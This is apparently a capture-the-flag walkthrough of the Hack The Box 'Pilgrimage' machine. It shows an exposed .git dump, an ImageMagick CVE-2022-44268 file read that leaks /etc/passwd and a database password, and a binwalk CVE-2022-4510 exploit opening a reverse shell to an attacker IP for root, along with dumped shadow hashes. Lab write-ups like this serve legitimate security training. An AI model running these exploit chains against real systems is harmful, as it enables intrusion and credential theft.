---
layout: post
title: HTB{Pilgrimage}
author: mr4ndr3w
tags: [write-up, hackthebox, machine, linux]
---
<!--cut-->

* TOC
{:toc}


### USER:

Scan [IP]:

`nmap -sC -sV -A [IP]`

```text
┌──(kali㉿kali)-[~/htb/machines/Pilgrimage]
└─$ nmap -sC -sV -A -p- -Pn 10.10.11.219
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-17 15:25 EDT
Stats: 0:01:06 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 59.62% done; ETC: 15:27 (0:00:44 remaining)
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.039s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-server-header: nginx/1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Pilgrimage - Shrink Your Images
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 128.06 seconds
```

Dump all the .git repository:

```text
┌──(kali㉿kali)-[~/htb/machines/Pilgrimage/git-dumper]
└─$ python3 git_dumper.py http://pilgrimage.htb/.git/ git
```
After analyzing I found that there is CVE related to majick version. 

```text
┌──(kali㉿kali)-[~/…/machines/Pilgrimage/git-dumper/git]
└─$ ./magick -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```
Clone this repo and run this exploit:

```text
https://github.com/kljunowsky/CVE-2022-44268
```

```text
┌──(kali㉿kali)-[~/htb/machines/Pilgrimage/CVE-2022-44268]
└─$ python3 CVE-2022-44268.py --image imagetopoison.png --file-to-read /etc/passwd --output poisoned.png
                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Pilgrimage/CVE-2022-44268]
└─$ ls
CVE-2022-44268.py  Dockerfile  imagetopoison.png  poisoned.png  README.md  requirements.txt
                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Pilgrimage/CVE-2022-44268]
└─$ python3 CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/652ee98aa4bb5.png                      
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false

```

We have to make changes in script .

```text
# Decrypt the raw profile type from hex format
decrypted_profile_type = raw_profile_type_stipped
```

```text
┌──(kali㉿kali)-[~/htb/machines/Pilgrimage/CVE-2022-44268]
└─$ python3 CVE-2022-44268.py --image imagetopoison.png --file-to-read /var/db/pilgrimage --output poisoned123.png
                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Pilgrimage/CVE-2022-44268]
└─$ python3 CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/652eee473cee7.png > dump.sql                     
                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Pilgrimage/CVE-2022-44268]
└─$ cat dump.sql| xxd -r -p - > sqlite.dump
                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Pilgrimage/CVE-2022-44268]
└─$ sqlite3 sqlite.dump 
SQLite version 3.43.1 2023-09-11 12:01:27
Enter ".help" for usage hints.
sqlite> select * from users;
emily|abigchonkyboi123
sqlite> 
```


Connect with ssh `emily` with password: `abigchonkyboi123`.

```text
┌──(kali㉿kali)-[~/htb/machines/Pilgrimage]
└─$ ssh emily@10.10.11.219         
The authenticity of host '10.10.11.219 (10.10.11.219)' can't be established.
ED25519 key fingerprint is SHA256:uaiHXGDnyKgs1xFxqBduddalajktO+mnpNkqx/HjsBw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.219' (ED25519) to the list of known hosts.
emily@10.10.11.219's password: 
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Oct 18 03:50:15 2023 from 10.10.14.212
emily@pilgrimage:~$ cat user.txt 
2e078e293f272be86f7151a171e580f0
```
### ROOT:


So, the next thing that we could check would be the ports that the machine is listening on.

```text
emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh 
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
    filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
    binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
        if [[ "$binout" == *"$banned"* ]]; then
            /usr/bin/rm "$filename"
            break
        fi
    done
done

```
After analyzing the .sh script I checked the binwalk version.


```text 
emily@pilgrimage:~$ binwalk -h

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk

```




And it was vulnerable to CVE-2022-4510

```text
┌──(kali㉿kali)-[~/htb/machines/Pilgrimage]
└─$ python3 51249.py imagetopoison.png 10.10.14.130 4444       

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.
```

After this you will get binwalk_exploit.png ………. copy it to /var/www/pilgrimage.htb/shrunk dir


```text
cat root.txt
bb5afc7f176a80de00fd4719adda1b14
cat /etc/shadow
root:$y$j9T$wlP.1uHMf0rRNBijw8HHv.$LLm1qK9ISnryNLz6wa0asgaOotvT7nbGC7py0d5nYoD:19398:0:99999:7:::
daemon:*:19398:0:99999:7:::
bin:*:19398:0:99999:7:::
sys:*:19398:0:99999:7:::
sync:*:19398:0:99999:7:::
games:*:19398:0:99999:7:::
man:*:19398:0:99999:7:::
lp:*:19398:0:99999:7:::
mail:*:19398:0:99999:7:::
news:*:19398:0:99999:7:::
uucp:*:19398:0:99999:7:::
proxy:*:19398:0:99999:7:::
www-data:*:19398:0:99999:7:::
backup:*:19398:0:99999:7:::
list:*:19398:0:99999:7:::
irc:*:19398:0:99999:7:::
gnats:*:19398:0:99999:7:::
nobody:*:19398:0:99999:7:::
_apt:*:19398:0:99999:7:::
systemd-network:*:19398:0:99999:7:::
systemd-resolve:*:19398:0:99999:7:::
messagebus:*:19398:0:99999:7:::
systemd-timesync:*:19398:0:99999:7:::
emily:$y$j9T$ktYE1a41rPMM9Qc8UOjaz0$kQrcvH7mLwn/xsppIViwVr01zcx8jFQWK4pl7lQicq0:19412:0:99999:7:::
systemd-coredump:!*:19398::::::
sshd:*:19399:0:99999:7:::
_laurel:!:19515::::::

```


